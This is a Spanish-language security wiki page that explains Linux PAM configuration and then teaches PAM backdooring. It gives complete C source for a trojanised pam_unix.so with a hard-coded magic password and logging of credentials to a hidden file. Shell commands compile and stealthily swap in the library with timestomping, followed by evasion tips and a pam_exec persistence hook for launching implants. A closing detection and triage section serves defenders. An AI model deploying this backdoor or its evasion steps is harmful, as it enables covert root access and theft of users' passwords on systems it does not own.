# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Información básica

**PAM (Pluggable Authentication Modules)** actúa como un mecanismo de seguridad que **verifica la identidad de los usuarios que intentan acceder a servicios informáticos**, controlando su acceso en función de diversos criterios. Es similar a un guardián digital, asegurando que solo los usuarios autorizados puedan interactuar con servicios específicos y, potencialmente, limitando su uso para evitar sobrecargas del sistema.

#### Archivos de configuración

- **Solaris and UNIX-based systems** suelen utilizar un archivo de configuración central ubicado en `/etc/pam.conf`.
- **Linux systems** prefieren un enfoque de directorio, almacenando configuraciones específicas por servicio dentro de `/etc/pam.d`. Por ejemplo, el archivo de configuración para el servicio login se encuentra en `/etc/pam.d/login`.

Un ejemplo de una configuración PAM para el servicio login podría verse así:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Estos ámbitos, o grupos de gestión, incluyen **auth**, **account**, **password** y **session**, cada uno responsable de diferentes aspectos del proceso de autenticación y de gestión de sesiones:

- **Auth**: Valida la identidad del usuario, a menudo solicitando una contraseña.
- **Account**: Gestiona la verificación de la cuenta, comprobando condiciones como pertenencia a grupos o restricciones por horario.
- **Password**: Gestiona las actualizaciones de contraseñas, incluyendo comprobaciones de complejidad o la prevención de ataques por diccionario.
- **Session**: Gestiona acciones durante el inicio o fin de una sesión de servicio, como montar directorios o establecer límites de recursos.

#### **PAM Module Controls**

Los controles dictan la respuesta del módulo ante el éxito o el fallo, influyendo en el proceso de autenticación en general. Estos incluyen:

- **Required**: El fallo de un módulo marcado como required resulta en un fallo eventual, pero solo después de comprobar todos los módulos siguientes.
- **Requisite**: Terminación inmediata del proceso ante un fallo.
- **Sufficient**: El éxito evita las comprobaciones restantes del mismo ámbito a menos que un módulo posterior falle.
- **Optional**: Solo provoca fallo si es el único módulo en la pila.

#### Escenario de ejemplo

En una configuración con múltiples módulos auth, el proceso sigue un orden estricto. Si el módulo `pam_securetty` considera el terminal de login no autorizado, los inicios de sesión de root se bloquean, pero todos los módulos siguen procesándose debido a su estado "required". El `pam_env` establece variables de entorno, potencialmente mejorando la experiencia del usuario. Los módulos `pam_ldap` y `pam_unix` trabajan juntos para autenticar al usuario, siendo `pam_unix` el que intenta usar una contraseña suministrada previamente, mejorando la eficiencia y la flexibilidad de los métodos de autenticación.


## Backdooring PAM – Hooking `pam_unix.so`

A classic persistence trick in high-value Linux environments is to **reemplazar la biblioteca PAM legítima por un drop-in trojanised**.  Because every SSH / console login ends up calling `pam_unix.so:pam_sm_authenticate()`, a few lines of C are enough to capture credentials or implement a *magic* password bypass.

### Hoja rápida de compilación
<details>
<summary>Ejemplo de troyano `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compilar y reemplazar sigilosamente:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Consejos de OpSec
1. **Atomic overwrite** – escribir en un archivo temporal y `mv` en su lugar para evitar bibliotecas medio-escritas que bloquearían SSH.
2. La colocación de archivos de log como `/usr/bin/.dbus.log` se mezcla con artefactos de escritorio legítimos.
3. Mantener las exportaciones de símbolos idénticas (`pam_sm_setcred`, etc.) para evitar el mal funcionamiento de PAM.

### Detección
* Compare MD5/SHA256 de `pam_unix.so` contra el paquete de la distro.
* `rpm -V pam` o `debsums -s libpam-modules` para detectar bibliotecas reemplazadas sin hash manual.
* Buscar permisos world-writable o propiedad inusual bajo `/lib/security/`.
* Regla de `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Hacer grep en las configuraciones de PAM para módulos inesperados: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Comandos de triage rápidos (post-compromise o threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusar de `pam_exec` para persistencia
En lugar de reemplazar `pam_unix.so`, una opción menos intrusiva es añadir una línea de `pam_exec` en `/etc/pam.d/sshd` para que cada inicio de sesión SSH lance un implant mientras se mantiene intacta la pila normal:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` se ejecuta como root dentro del contexto PAM de sshd, por lo que el script puede drop reverse shells, recopilar env vars o reabrir sockets implantados sin realizar cambios en el sistema de archivos ni en las core libraries.

## Referencias

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
